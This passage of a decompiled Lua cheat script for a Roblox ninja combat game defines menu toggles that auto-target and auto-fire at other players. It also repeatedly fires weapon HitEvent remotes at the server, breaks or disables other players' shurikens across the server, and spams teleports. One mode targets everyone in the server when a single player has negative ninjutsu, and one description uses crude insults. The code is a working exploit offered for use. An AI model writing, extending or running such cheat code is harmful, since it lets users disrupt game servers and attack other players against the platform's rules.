                    vu70.AutoTarget = true
                    function vu71.CharacterTouched.AutoTargetting(p1150)
                        if vu70.AutoTarget then
                            local v1151, v1152, v1153 = pairs(vu70.AutoTargetMode)
                            while true do
                                local v1154, v1155 = v1151(v1152, v1153)
                                if v1154 == nil then
                                    break
                                end
                                if v1155 then
                                    if p1150.Name ~= "ThrownKunai" then
                                        if p1150.Parent.Name ~= "Sword" or (not vu70.AutoTarget or (not v1155 or (p1150.Parent.Parent.Name == vu53.LocalPlayer.Name or (vu71.ListFind("Targetlist", p1150.Parent.Parent.Name, v1154) or vu71.ListFind("Whitelist", p1150.Parent.Parent.Name))))) then
                                            v1153 = v1154
                                        elseif vu70.FireOnGodMode then
                                            vu71.ListInsert("Targetlist", p1150.Parent.Parent.Name, v1154)
                                            vu71.Notify("System", "Added " .. p1150.Parent.Parent.Name .. " to the " .. v1154 .. " Targetlist")
                                            v1153 = v1154
                                        else
                                            local v1156 = vu53
                                            if not vu71.IsGodded(v1156:FindFirstChild(p1150.Parent.Parent.Name)) then
                                            end
                                            v1153 = v1154
                                        end
                                    else
                                        if p1150:FindFirstChild("creator") then
                                            v1153 = v1154
                                        else
                                            v1153 = v1154
                                            repeat
                                                task.wait()
                                            until p1150:FindFirstChild("creator")
                                        end
                                        if vu70.AutoTarget and (v1155 and (p1150:FindFirstChild("creator").Value ~= vu53.LocalPlayer and (not vu71.ListFind("Targetlist", p1150.creator.Value.Name, v1154) and (not vu71.ListFind("Whitelist", p1150.creator.Value.Name) and (vu70.FireOnGodMode or not vu71.IsGodded(p1150.creator.Value)))))) then
                                            vu71.ListInsert("Targetlist", p1150.creator.Value.Name, v1154)
                                            vu71.Notify("System", "Added " .. p1150.creator.Value.Name .. " to the " .. v1154 .. " Targetlist")
                                        end
                                    end
                                else
                                    v1153 = v1154
                                end
                            end
                        end
                    end
                else
                    pcall(function()
                        vu70.AutoTarget = false
                        vu71.CharacterTouched.AutoTargetting = nil
                    end)
                end
            end
        })
        vu476({
            AutoWLTarget = false
        })
        v1108:AddToggle("AutoWhitelistTarget", {
            Title = "Auto Whitelist Target",
            Description = "Automatically adds players to a set targetlist when they hit anyone on the whitelist. Can be configured in settings.",
            Default = false,
            Callback = function(p1157)
                if p1157 then
                    vu70.AutoWLTarget = true
                    function vu71.WhitelistCharacterTouched.AutoWhitelistTargetting(p1158, p1159)
                        if vu70.AutoWLTarget and vu71.ListFind("Whitelist", p1159.Name) then
                            local v1160, v1161, v1162 = pairs(vu70.AutoTargetMode)
                            while true do
                                local v1163, v1164 = v1160(v1161, v1162)
                                if v1163 == nil then
                                    break
                                end
                                if v1164 then
                                    if p1158.Name ~= "ThrownKunai" then
                                        if p1158.Parent.Name ~= "Sword" or (not vu70.AutoWLTarget or (not v1164 or (p1158.Parent.Parent.Name == vu53.LocalPlayer.Name or (vu71.ListFind("Targetlist", p1158.Parent.Parent.Name, v1163) or vu71.ListFind("Whitelist", p1158.Parent.Parent.Name))))) then
                                            v1162 = v1163
                                        elseif vu70.FireOnGodMode then
                                            vu71.ListInsert("Targetlist", p1158.Parent.Parent.Name, v1163)
                                            vu71.Notify("System", "Added " .. p1158.Parent.Parent.Name .. " to the " .. v1163 .. " Targetlist")
                                            v1162 = v1163
                                        else
                                            local v1165 = vu53
                                            if not vu71.IsGodded(v1165:FindFirstChild(p1158.Parent.Parent.Name)) then
                                            end
                                            v1162 = v1163
                                        end
                                    else
                                        if p1158:FindFirstChild("creator") then
                                            v1162 = v1163
                                        else
                                            v1162 = v1163
                                            repeat
                                                task.wait()
                                            until p1158:FindFirstChild("creator")
                                        end
                                        if vu70.AutoWLTarget and (v1164 and (p1158:FindFirstChild("creator").Value ~= vu53.LocalPlayer and (not vu71.ListFind("Targetlist", p1158.creator.Value.Name, v1163) and (not vu71.ListFind("Whitelist", p1158.creator.Value.Name) and (vu70.FireOnGodMode or not vu71.IsGodded(p1158.creator.Value)))))) then
                                            vu71.ListInsert("Targetlist", p1158.creator.Value.Name, v1163)
                                            vu71.Notify("System", "Added " .. p1158.creator.Value.Name .. " to the " .. v1163 .. " Targetlist")
                                        end
                                    end
                                else
                                    v1162 = v1163
                                end
                            end
                        end
                    end
                else
                    pcall(function()
                        vu70.AutoWLTarget = false
                        vu71.WhitelistCharacterTouched.AutoWhitelistTargetting = nil
                    end)
                end
            end
        })
        vu476({
            AutoFire = false,
            AutoFireWait = 0.02,
            AutoFireFinishWait = 0.02,
            OptionalEquip = false,
            ServerShurikens = false,
            PlayerShurikenCheck = false
        })
        v1108:AddToggle("AutoFire", {
            Title = "Auto Fire",
            Description = "Automatically fires when there are players in the targetlist at all.",
            Default = false,
            Callback = function(p1166)
                if p1166 then
                    vu70.AutoFire = true
                    local vu1167 = {
                        game:GetService("RunService").Stepped,
                        game:GetService("RunService").Heartbeat,
                        game:GetService("RunService").RenderStepped
                    }
                    local vu1168 = 0
                    local function vu1169()
                        if vu70.AutoFireWait < 0 then
                            if vu70.AutoFireWait == - 1 then
                                vu1168 = vu1168 + 1
                                vu1167[vu1168]:wait()
                                if vu1168 >= 3 then
                                    vu1168 = 0
                                end
                            end
                        else
                            task.wait(vu70.AutoFireWait)
                        end
                    end
                    coroutine.resume(coroutine.create(function()
                        while vu70.AutoFire do
                            local v1170 = vu71.GetTargetPlayer(true)
                            if v1170 then
                                local v1171 = vu53:GetPlayerFromCharacter(v1170)
                                if v1171 and vu71.GetAimPart(v1170) then
                                    local v1172 = vu71.BoolsToBinary({
                                        vu70.AirStrikeMode,
                                        vu70.PredictMode,
                                        vu70.ServerShurikens,
                                        vu70.ShotgunFire
                                    })
                                    if string.sub(v1172, 2, 2) ~= "1" then
                                        vu455.AutoFire[v1172](v1171, vu1169)
                                    end
                                end
                            end
                            task.wait()
                        end
                    end))
                else
                    pcall(function()
                        vu70.AutoFire = false
                    end)
                end
            end
        })
        vu476({
            PredictFire = false
        })
        v1108:AddToggle("PredictFire", {
            Title = "Predict Fire",
            Description = "Auto fire but for predict mode",
            Default = false,
            Callback = function(p1173)
                vu70.PredictFire = p1173
                if p1173 then
                    local vu1174 = false
                    local vu1175 = {}
                    coroutine.resume(coroutine.create(function()
                        while vu70.PredictFire do
                            local v1176 = vu71.GetTargetPlayer(true)
                            if v1176 then
                                local v1177 = vu53:GetPlayerFromCharacter(v1176)
                                if v1177 and (vu71.GetAimPart(v1176) and string.sub(code, 2, 2) == "1") then
                                    vu455.AutoFire["0100"](v1177, vu1174, vu1175)
                                end
                            end
                            task.wait()
                        end
                    end))
                    function vu71.WorkspaceDescendantAdded.AutoFirePredict(p1178)
                        if vu70.PredictMode and p1178.Name == "ThrownKunai" then
                            vu71.FormallyWaitForChild(p1178, "creator")
                            if p1178:FindFirstChild("creator") and p1178:FindFirstChild("creator").Value == vu53.LocalPlayer then
                                vu1174 = true
                            end
                        end
                    end
                else
                    pcall(function()
                        vu70.PredictMode = false
                        vu71.WorkspaceDescendantAdded.AutoFirePredict = nil
                    end)
                end
            end
        })
        vu476({
            Savior = false,
            SaviorPercent = 0.5
        })
        v1108:AddToggle("Savior", {
            Title = "Savior",
            Description = "Saves you and your rep by resetting you at a certain health so the other player doesn\'t get a kill.",
            Default = false,
            Callback = function(p1179)
                if p1179 then
                    vu70.Savior = true
                    local function vu1181(p1180)
                        if vu70.Savior and p1180 <= vu64:FindFirstChild("Humanoid").MaxHealth * vu70.SaviorPercent then
                            vu64:FindFirstChild("Humanoid").Health = 0
                        end
                    end
                    hpchanging = vu64:WaitForChild("Humanoid", math.huge).HealthChanged:Connect(vu1181)
                    function vu71.CharacterAdded.Savior()
                        hpchanging = vu64:WaitForChild("Humanoid", math.huge).HealthChanged:Connect(vu1181)
                    end
                else
                    pcall(function()
                        vu70.Savior = false
                        vu71.CharacterAdded.Savior = nil
                        hpchanging:Disconnect()
                    end)
                end
            end
        })
        vu476({
            BreakShurs = false
        })
        v1108:AddToggle("BreakShurikens", {
            Title = "Break Shurikens",
            Description = "Breaks everyones shurikens that are in the BreakShurlist.",
            Default = false,
            Callback = function(p1182)
                vu70.BreakShurs = p1182
                if p1182 then
                    local v1183 = vu53
                    local v1184, v1185, v1186 = pairs(v1183:GetPlayers())
                    while true do
                        local v1187
                        v1186, v1187 = v1184(v1185, v1186)
                        if v1186 == nil then
                            break
                        end
                        vu71.StartPlayerBreaking(v1187, "BreakShurs", "BreakShurlist")
                    end
                    function vu71.PlayerAdded.MainBreakShurs(p1188)
                        vu71.StartPlayerBreaking(p1188, "BreakShurs", "BreakShurlist")
                    end
                    function vu71.PlayerRemoved.MainBreakShurs(p1189)
                        vu71.StopPlayerBreaking(p1189, "BreakShurs")
                    end
                else
                    vu71.PlayerAdded.MainBreakShurs = nil
                    vu71.PlayerRemoved.MainBreakShurs = nil
                    local v1190 = vu53
                    local v1191, v1192, v1193 = pairs(v1190:GetPlayers())
                    while true do
                        local v1194
                        v1193, v1194 = v1191(v1192, v1193)
                        if v1193 == nil then
                            break
                        end
                        vu71.StopPlayerBreaking(v1194, "BreakShurs")
                    end
                end
            end
        })
        vu476({
            DisableShurs = false
        })
        v1108:AddToggle("DisableShurikens", {
            Title = "Disable Shurikens",
            Description = "Disables the shurikens of the entire server when a player in the DisableShurslist is in the game.",
            Default = false,
            Callback = function(p1195)
                vu70.DisableShurs = p1195
                if p1195 then
                    if vu71.IsListPlayerInServer("DisableShurslist") then
                        local v1196 = vu53
                        local v1197, v1198, v1199 = pairs(v1196:GetPlayers())
                        while true do
                            local v1200
                            v1199, v1200 = v1197(v1198, v1199)
                            if v1199 == nil then
                                break
                            end
                            vu71.StartPlayerBreaking(v1200, "DisableShurs")
                        end
                    end
                    function vu71.PlayerAdded.MainDisableShurs(p1201)
                        if vu71.IsListPlayerInServer("DisableShurslist") then
                            vu71.StartPlayerBreaking(p1201, "DisableShurs")
                        end
                    end
                    function vu71.PlayerRemoved.MainDisableShurs(p1202)
                        vu71.StopPlayerBreaking(p1202, "DisableShurs")
                    end
                else
                    vu71.PlayerAdded.MainDisableShurs = nil
                    vu71.PlayerRemoved.MainDisableShurs = nil
                    local v1203 = vu53
                    local v1204, v1205, v1206 = pairs(v1203:GetPlayers())
                    while true do
                        local v1207
                        v1206, v1207 = v1204(v1205, v1206)
                        if v1206 == nil then
                            break
                        end
                        vu71.StopPlayerBreaking(v1207, "DisableShurs")
                    end
                end
            end
        })
        vu476({
            AutoBreakShurs = false,
            AutoBreakShurikensMode = {
                Soft = true,
                Semi = false,
                Normal = false,
                Permanent = false
            }
        })
        v1108:AddToggle("AutoBreakShurikens", {
            Title = "Auto Break Shurikens",
            Description = "Automatically breaks the shurikens of players that hit you.",
            Default = false,
            Callback = function(p1208)
                if p1208 then
                    vu70.AutoBreakShurs = true
                    coroutine.resume(coroutine.create(function()
                        while vu70.AutoBreakShurs do
                            local v1209 = vu53
                            local v1210, v1211, v1212 = pairs(v1209:GetPlayers())
                            while true do
                                local v1213
                                v1212, v1213 = v1210(v1211, v1212)
                                if v1212 == nil then
                                    break
                                end
                                if v1213:FindFirstChild("leaderstats") and (v1213.leaderstats:FindFirstChild("Ninjutsu") and (not vu71.ListFind("Whitelist", v1213.Name) and (not vu71.ListFind("BreakShurlist", v1213.Name, "Normal") and v1213.leaderstats.Ninjutsu.Value < 0))) then
                                    vu71.ListInsert("BreakShurlist", v1213.Name, "Normal")
                                    vu71.Notify("System", "Added " .. v1213.Name .. " to the Normal BreakShurlist")
                                end
                            end
                            task.wait(0.1)
                        end
                    end))
                    function vu71.CharacterTouched.AutoBreakShurikens(p1214)
                        if vu70.AutoBreakShurs then
                            local v1215, v1216, v1217 = pairs(vu70.AutoBreakShurikensMode)
                            while true do
                                local v1218, v1219 = v1215(v1216, v1217)
                                if v1218 == nil then
                                    break
                                end
                                if v1219 then
                                    if p1214.Name ~= "ThrownKunai" then
                                        if p1214.Parent.Name ~= "Sword" or (not vu70.AutoBreakShurs or (not v1219 or (p1214.Parent.Parent.Name == vu53.LocalPlayer.Name or (vu71.ListFind("BreakShurlist", p1214.Parent.Parent.Name, v1218) or vu71.ListFind("Whitelist", p1214.Parent.Parent.Name))))) then
                                            v1217 = v1218
                                        else
                                            vu71.ListInsert("BreakShurlist", p1214.Parent.Parent.Name, v1218)
                                            vu71.Notify("System", "Added " .. p1214.Parent.Parent.Name .. " to the " .. v1218 .. " BreakShurlist")
                                            v1217 = v1218
                                        end
                                    else
                                        if p1214:FindFirstChild("creator") then
                                            v1217 = v1218
                                        else
                                            v1217 = v1218
                                            repeat
                                                task.wait()
                                            until p1214:FindFirstChild("creator")
                                        end
                                        if vu70.AutoBreakShurs and (v1219 and (p1214:FindFirstChild("creator").Value ~= vu53.LocalPlayer and not (vu71.ListFind("BreakShurlist", p1214.creator.Value.Name, v1218) or vu71.ListFind("Whitelist", p1214.creator.Value.Name)))) then
                                            vu71.ListInsert("BreakShurlist", p1214.creator.Value.Name, v1218)
                                            vu71.Notify("System", "Added " .. p1214.creator.Value.Name .. " to the " .. v1218 .. " BreakShurlist")
                                        end
                                    end
                                else
                                    v1217 = v1218
                                end
                            end
                        end
                    end
                else
                    pcall(function()
                        vu70.AutoBreakShurs = false
                        vu71.CharacterTouched.AutoBreakShurikens = nil
                    end)
                end
            end
        })
        vu476({
            AutoWLBreakShurs = false
        })
        v1108:AddToggle("AutoWhitelistBreakShurikens", {
            Title = "Auto Whitelist Break Shurikens",
            Description = "Automatically breaks the shurikens of players who hit whitelisted players.",
            Default = false,
            Callback = function(p1220)
                if p1220 then
                    vu70.AutoWLBreakShurs = true
                    function vu71.WhitelistCharacterTouched.AutoWhitelistBreakShurikens(p1221, p1222)
                        if vu70.AutoWLBreakShurs and vu71.ListFind("Whitelist", p1222.Name) then
                            local v1223, v1224, v1225 = pairs(vu70.AutoBreakShurikensMode)
                            while true do
                                local v1226, v1227 = v1223(v1224, v1225)
                                if v1226 == nil then
                                    break
                                end
                                if v1227 then
                                    if p1221.Name ~= "ThrownKunai" then
                                        if p1221.Parent.Name ~= "Sword" or (not vu70.AutoWLBreakShurs or (not v1227 or (p1221.Parent.Parent.Name == vu53.LocalPlayer.Name or (vu71.ListFind("BreakShurlist", p1221.Parent.Parent.Name, v1226) or vu71.ListFind("Whitelist", p1221.Parent.Parent.Name))))) then
                                            v1225 = v1226
                                        else
                                            vu71.ListInsert("BreakShurlist", p1221.Parent.Parent.Name, v1226)
                                            vu71.Notify("System", "Added " .. p1221.Parent.Parent.Name .. " to the " .. v1226 .. " BreakShurlist")
                                            v1225 = v1226
                                        end
                                    else
                                        if p1221:FindFirstChild("creator") then
                                            v1225 = v1226
                                        else
                                            v1225 = v1226
                                            repeat
                                                task.wait()
                                            until p1221:FindFirstChild("creator")
                                        end
                                        if vu70.AutoWLBreakShurs and (v1227 and (p1221:FindFirstChild("creator").Value ~= vu53.LocalPlayer and not (vu71.ListFind("BreakShurlist", p1221.creator.Value.Name, v1226) or vu71.ListFind("Whitelist", p1221.creator.Value.Name)))) then
                                            vu71.ListInsert("BreakShurlist", p1221.creator.Value.Name, v1226)
                                            vu71.Notify("System", "Added " .. p1221.creator.Value.Name .. " to the " .. v1226 .. " BreakShurlist")
                                        end
                                    end
                                else
                                    v1225 = v1226
                                end
                            end
                        end
                    end
                else
                    pcall(function()
                        vu70.AutoWLBreakShurs = false
                        vu71.CharacterTouched.AutoWhitelistBreakShurikens = nil
                    end)
                end
            end
        })
        vu476({
            ActivateHitEvent = false,
            HitEventWait = 0.02,
            HitEventFinishWait = 0.02,
            HitEventWeapons = {
                Sword = false,
                Shuriken = false,
                Teleport = false
            }
        })
        v1108:AddToggle("ActivateHitEvent", {
            Title = "Activate Hit Event",
            Description = "Constantly fires selected weapon\'s hit events which makes the sword constantly fire.",
            Default = false,
            Callback = function(p1228)
                if p1228 then
                    vu70.ActivateHitEvent = false
                    task.wait()
                    vu70.ActivateHitEvent = true
                    task.spawn(function()
                        local v1229 = {
                            game:GetService("RunService").Stepped,
                            game:GetService("RunService").Heartbeat,
                            game:GetService("RunService").RenderStepped
                        }
                        local v1230 = 0
                        while vu70.ActivateHitEvent do
                            local v1231, v1232, v1233 = pairs(vu70.HitEventWeapons)
                            while true do
                                local v1234
                                v1233, v1234 = v1231(v1232, v1233)
                                if v1233 == nil then
                                    break
                                end
                                if v1234 and vu53.LocalPlayer.Character and vu53.LocalPlayer.Character:FindFirstChild(v1233) then
                                    local v1235, v1236, v1237 = pairs(vu53.LocalPlayer.Character:GetChildren())
                                    local v1238 = v1233
                                    while true do
                                        local v1239
                                        v1237, v1239 = v1235(v1236, v1237)
                                        if v1237 == nil then
                                            break
                                        end
                                        if v1239.Name == v1238 and (v1239:FindFirstChild("HitEvent") and vu70.ActivateHitEvent) then
                                            v1239.HitEvent:FireServer()
                                            if vu70.HitEventWait < 0 then
                                                if vu70.HitEventWait == - 1 then
                                                    v1230 = (v1230 >= 3 and 0 or v1230) + 1
                                                    v1229[v1230]:Wait()
                                                end
                                            else
                                                task.wait(vu70.HitEventWait)
                                            end
                                        end
                                    end
                                end
                            end
                            if vu70.HitEventFinishWait < 0 then
                                if vu70.HitEventFinishWait < 0 then
                                    v1230 = (v1230 >= 3 and 0 or v1230) + 1
                                    v1229[v1230]:Wait()
                                end
                            else
                                task.wait(vu70.HitEventFinishWait)
                            end
                        end
                    end)
                else
                    vu70.ActivateHitEvent = false
                end
            end
        })
        vu476({
            WeaponAutoEquip = false,
            AutoEquipWeapons = {
                Sword = false,
                Shuriken = false,
                Teleport = false
            }
        })
        v1108:AddToggle("WeaponAutoEquip", {
            Title = "Weapon Auto Equip",
            Description = "Automatically equips weapons from the weapon list.",
            Default = false,
            Callback = function(p1240)
                if p1240 then
                    vu70.WeaponAutoEquip = false
                    task.wait()
                    vu70.WeaponAutoEquip = true
                    coroutine.resume(coroutine.create(function()
                        while vu70.WeaponAutoEquip do
                            local v1241, v1242, v1243 = pairs(vu70.AutoEquipWeapons)
                            while true do
                                local v1244
                                v1243, v1244 = v1241(v1242, v1243)
                                if v1243 == nil then
                                    break
                                end
                                if v1244 and (vu64 and not vu70.CharRespawning) and (not vu64:FindFirstChild(v1243) and vu53.LocalPlayer.Backpack:FindFirstChild(v1243)) then
                                    vu53.LocalPlayer.Backpack:FindFirstChild(v1243).Parent = vu64
                                end
                            end
                            task.wait()
                        end
                    end))
                else
                    vu70.WeaponAutoEquip = false
                end
            end
        })
        vu476({
            HoldClick = false,
            HoldClickMode = {
                Train = false,
                Sword = false,
                Shuriken = false,
                Teleport = false
            },
            Holding = {}
        })
        v1108:AddToggle("HoldClick", {
            Title = "Hold Click",
            Description = "Hold down left mouse button to activate certain tools. Configure which ones in settings.",
            Default = false,
            Callback = function(p1245)
                if p1245 then
                    vu70.HoldClick = true
                    local vu1246 = false
                    local vu1247 = {}
                    local vu1248 = {
                        game:GetService("RunService").Stepped,
                        game:GetService("RunService").Heartbeat,
                        game:GetService("RunService").RenderStepped
                    }
                    local vu1249 = 0
                    local function vu1252(p1250, p1251)
                        if vu70[p1250] < 0 then
                            if not p1251 and vu70[p1250] == - 1 or p1251 and vu70[p1250] <= - 1 then
                                if vu1249 >= 3 then
                                    vu1249 = 0
                                end
                                vu1249 = vu1249 + 1
                                vu1248[vu1249]:Wait()
                            end
                        else
                            task.wait(vu70[p1250])
                        end
                    end
                    function vu71.UserInputBegan.HoldClick(p1253, p1254)
                        if not p1254 and (p1253.UserInputType == Enum.UserInputType.MouseButton1 and vu70.HoldClick) then
                            local v1255, v1256, vu1257 = pairs(vu70.HoldClickMode)
                            while true do
                                local v1258
                                vu1257, v1258 = v1255(v1256, vu1257)
                                if vu1257 == nil then
                                    break
                                end
                                vu70.Holding[vu1257] = v1258
                                coroutine.resume(coroutine.create(function()
                                    while vu70.Holding[vu1257] do
                                        if vu1257 == "Shuriken" then
                                            if vu1257 == "Shuriken" then
                                                local v1259 = vu71.BoolsToBinary({
                                                    vu70.AirStrikeMode,
                                                    vu70.PredictMode,
                                                    vu70.ServerShurikens,
                                                    vu70.ShotgunFire
                                                })
                                                if string.sub(v1259, 2, 2) == "1" then
                                                    vu455.HoldClick["0100"](vu1246, vu1247)
                                                else
                                                    vu455.HoldClick[v1259](vu1257, vu1252)
                                                end
                                            end
                                        elseif vu64 and vu64:FindFirstChild(vu1257) then
                                            local v1260 = vu64
                                            local v1261, v1262, v1263 = pairs(v1260:GetChildren())
                                            while true do
                                                local v1264
                                                v1263, v1264 = v1261(v1262, v1263)
                                                if v1263 == nil then
                                                    break
                                                end
                                                if v1264.Name == vu1257 and vu70.Holding[vu1257] then
                                                    v1264:Activate()
                                                end
                                            end
                                        end
                                        vu1252("AutoFireFinishWait", true)
                                    end
                                end))
                            end
                        end
                    end
                    function vu71.UserInputEnded.HoldClick(p1265, p1266)
                        if not p1266 and p1265.UserInputType == Enum.UserInputType.MouseButton1 then
                            local v1267, v1268, v1269 = pairs(vu70.Holding)
                            while true do
                                local v1270
                                v1269, v1270 = v1267(v1268, v1269)
                                if v1269 == nil then
                                    break
                                end
                                vu70.Holding[v1269] = false
                            end
                        end
                    end
                else
                    vu70.HoldClick = false
                    vu71.UserInputBegan.HoldClick = nil
                    vu71.UserInputEnded.HoldClick = nil
                    if vu64 then
                        local v1271 = vu64
                        local v1272, v1273, v1274 = pairs(v1271:GetChildren())
                        while true do
                            local v1275, v1276 = v1272(v1273, v1274)
                            if v1275 == nil then
                                break
                            end
                            v1274 = v1275
                            if v1276.Name == "Shuriken" and v1276.Enabled == false then
                                v1276.Enabled = true
                            end
                        end
                    end
                    local v1277, v1278, v1279 = pairs(vu53.LocalPlayer.Backpack)
                    while true do
                        local v1280, v1281 = v1277(v1278, v1279)
                        if v1280 == nil then
                            break
                        end
                        v1279 = v1280
                        if v1281.Name == "Shuriken" and v1281.Enabled == false then
                            v1281.Enabled = true
                        end
                    end
                end
            end
        })
        vu476({
            AntiNegativeNinjutsu = false,
            Innocents = {},
            HookedPlayers = {}
        })
        v1108:AddToggle("AntiNegativeNinjutsu", {
            Title = "Anti Negative Ninjutsu",
            Description = "If a player has negative ninjutsu, this will kill everyone in the server until that player leaves the game. This excludes the whitelist.",
            Default = false,
            Callback = function(p1282)
                if p1282 then
                    local vu1283 = false
                    local function vu1307(p1284)
                        vu1283 = true
                        local vu1285 = p1284
                        local function vu1287(p1286)
                            if not vu71.ListFind("Whitelist", p1286.Name) then
                                if p1286 ~= vu1285 then
                                    table.insert(vu70.Innocents, p1286.Name)
                                end
                                vu71.ListInsert("Targetlist", p1286.Name, "Normal")
                            end
                        end
                        local function vu1289(p1288)
                            if table.find(vu70.Innocents, p1288) and p1288 ~= vu1285 then
                                table.remove(vu70.Innocents, table.find(vu70.Innocents, p1288))
                                vu71.ListRemove("Targetlist", p1288.Name, "Normal")
                            end
                        end
                        local v1290 = vu53
                        local v1291, v1292, v1293 = pairs(v1290:GetPlayers())
                        local vu1294 = vu1285
                        while true do
                            local v1295
                            v1293, v1295 = v1291(v1292, v1293)
                            if v1293 == nil then
                                break
                            end
                            vu1287(v1295)
                        end
                        function vu71.PlayerAdded.AntiNegativeNin(p1296)
                            vu1287(p1296)
                        end
                        function vu71.PlayerRemoved.AntiNegativeNin(p1297)
                            vu1289(p1297)
                            if p1297 == vu1294 then
                                vu71.Notify("System", p1297.Name .. " left the server, stopping anti negative ninjutsu protocol..")
                                task.wait()
                                vu71.PlayerAdded.AntiNegativeNin = nil
                                vu71.PlayerRemoved.AntiNegativeNin = nil
                                local v1298, v1299, v1300 = pairs(vu70.Innocents)
                                while true do
                                    local v1301
                                    v1300, v1301 = v1298(v1299, v1300)
                                    if v1300 == nil then
                                        break
                                    end
                                    vu71.ListRemove("Targetlist", v1301, "Normal")
                                end
                                table.clear(vu70.Innocents)
                                vu1283 = false
                                local v1302 = vu53
                                local v1303, v1304, v1305 = pairs(v1302:GetPlayers())
                                while true do
                                    local v1306
                                    v1305, v1306 = v1303(v1304, v1305)
                                    if v1305 == nil then
                                        break
                                    end
                                    if v1306 ~= vu53.LocalPlayer and v1306:FindFirstChild("leaderstats") and (v1306.leaderstats:FindFirstChild("Ninjutsu") and (v1306.leaderstats.Ninjutsu.Value < 0 and not vu1283)) then
                                        vu71.Notify("System", "Detecting negative ninjutsu from " .. v1306.Name .. ", starting anti negative ninjutsu protocol..")
                                        vu1307(v1306)
                                    end
                                end
                            end
                        end
                    end
                    local function vu1309(p1308)
                        if p1308:FindFirstChild("leaderstats") and (p1308.leaderstats:FindFirstChild("Ninjutsu") and (p1308.leaderstats.Ninjutsu.Value < 0 and not vu1283)) then
                            vu71.Notify("System", "Detecting negative ninjutsu from " .. p1308.Name .. ", starting anti negative ninjutsu protocol..")
                            vu1307(p1308)
                        end
                    end
                    local function vu1311(pu1310)
                        repeat
                            task.wait()
                        until pu1310:FindFirstChild("leaderstats")
                        vu70.HookedPlayers[pu1310.Name] = pu1310.leaderstats:WaitForChild("Ninjutsu"):GetPropertyChangedSignal("Value"):Connect(function()
                            vu1309(pu1310)
                        end)
                    end
                    local v1312 = vu53
                    local v1313, v1314, v1315 = pairs(v1312:GetPlayers())
                    local v1316 = vu1309
                    while true do
                        local vu1317
                        v1315, vu1317 = v1313(v1314, v1315)
                        if v1315 == nil then
                            break
                        end
                        if vu1317 ~= vu53.LocalPlayer then
                            task.spawn(function()
                                vu1311(vu1317)
                            end)
                            v1316(vu1317)
                        end
                    end
                    function vu71.PlayerAdded.HookNinjutsu(pu1318)
                        task.spawn(function()
                            vu1311(pu1318)
                        end)
                    end
                    function vu71.PlayerRemoved.UnHookNinjutsu(p1319)
                        if vu70.HookedPlayers[p1319.Name] then
                            vu70.HookedPlayers[p1319.Name]:Disconnect()
                            vu70.HookedPlayers[p1319.Name] = nil
                        end
                    end
                else
                    vu71.PlayerAdded.HookNinjutsu = nil
                    vu71.PlayerRemoved.UnHookNinjutsu = nil
                    vu71.PlayerAdded.AntiNegativeNin = nil
                    vu71.PlayerRemoved.AntiNegativeNin = nil
                    local v1320, v1321, v1322 = pairs(vu70.Innocents)
                    while true do
                        local v1323
                        v1322, v1323 = v1320(v1321, v1322)
                        if v1322 == nil then
                            break
                        end
                        vu71.ListRemove("Targetlist", v1323.Name, "Normal")
                    end
                    table.clear(vu70.Innocents)
                    local v1324, v1325, v1326 = pairs(vu70.HookedPlayers)
                    while true do
                        local v1327
                        v1326, v1327 = v1324(v1325, v1326)
                        if v1326 == nil then
                            break
                        end
                        vu70.HookedPlayers[v1326]:Disconnect()
                        vu70.HookedPlayers[v1326] = nil
                    end
                end
            end
        })
        vu476({
            AntiShurikenBlock = false,
            AntiShurikenBlockRadius = 10
        })
        v1108:AddToggle("AntiShurikenBlock", {
            Title = "Anti Shuriken Block",
            Description = "Teleports your HumanoidRootPart around so those dumbass idiot god moded bitches don\'t block your shurikens while you shoot.",
            Default = false,
            Callback = function(p1328)
                vu70.AntiShurikenBlock = p1328
                repeat
                    task.wait()
                until vu71.GetRoot(vu64)
                local vu1329 = vu71.GetRoot(vu64).Position
                coroutine.resume(coroutine.create(function()
                    while vu70.AntiShurikenBlock do
                        if vu53.LocalPlayer:FindFirstChild("Backpack") and (vu53.LocalPlayer.Backpack:FindFirstChild("Teleport") and vu53.LocalPlayer.Backpack.Teleport:FindFirstChild("HitEvent")) then
                            local v1330 = Vector3.new(math.random(- vu70.AntiShurikenBlockRadius, vu70.AntiShurikenBlockRadius), 0, math.random(- vu70.AntiShurikenBlockRadius, vu70.AntiShurikenBlockRadius))
                            vu53.LocalPlayer.Backpack.Teleport.HitEvent:FireServer(vu1329 + v1330)
                        end
                        task.wait(0.2)
                    end
                end))
            end
        })
        local v1331 = vu457.Combat:AddSection("Settings")
        v1331:AddDropdown("AutoTargetMode", {
            Title = "Auto Target Mode",
            Description = "Mode that Auto Target uses.",
            Values = vu73.Modes,
            Multi = false,
            Default = "Soft"
        })
        v1331:AddDropdown("AutoBreakShurikensMode", {
            Title = "Auto Break Shurikens Mode",
            Description = "Mode that ABS uses.",
            Values = vu73.Modes,
            Multi = false,
            Default = "Soft"
        })
        v1331:AddDropdown("HoldClickMode", {
            Title = "Hold Click Mode",
            Description = "Mode that hold click uses.",
            Values = vu73.Tools,
            Multi = true,
            Default = {}
        })
        v1331:AddDropdown("AimPart", {
            Title = "Aim Part",
            Description = "Configure the aim part.",
            Values = vu73.BodyParts,
            Multi = false,
            Default = "Head"
        })
        v1331:AddDropdown("HitEventWeapon", {
            Title = "Hit Event Weapon",
            Description = "Configure hit event weapon.",
            Values = vu73.Weapons,
            Multi = true,
            Default = {}
        })
        v1331:AddDropdown("AutoEquipWeapon", {
            Title = "Auto Equip Weapon",
            Description = "Auto equip a weapon.",
            Values = vu73.Weapons,
            Multi = true,
            Default = {}
        })
        vu67.AutoTargetMode:OnChanged(function(p1332)
            local v1333, v1334, v1335 = pairs(vu70.AutoTargetMode)
            while true do
                local v1336
                v1335, v1336 = v1333(v1334, v1335)
                if v1335 == nil then
                    break
                end
                vu70.AutoTargetMode[v1335] = false
            end
            vu70.AutoTargetMode[p1332] = true
        end)
        vu67.AutoBreakShurikensMode:OnChanged(function(p1337)
            local v1338, v1339, v1340 = pairs(vu70.AutoBreakShurikensMode)
            while true do
                local v1341
                v1340, v1341 = v1338(v1339, v1340)
                if v1340 == nil then
                    break
                end
                vu70.AutoBreakShurikensMode[v1340] = false
            end
            vu70.AutoBreakShurikensMode[p1337] = true
        end)
        vu67.HoldClickMode:OnChanged(function(p1342)
            local v1343, v1344, v1345 = pairs(vu70.HoldClickMode)
            while true do
                local v1346
                v1345, v1346 = v1343(v1344, v1345)
                if v1345 == nil then
                    break
                end
                if p1342[v1345] then
                    vu70.HoldClickMode[v1345] = true
                else
                    vu70.HoldClickMode[v1345] = false
                end
            end
        end)
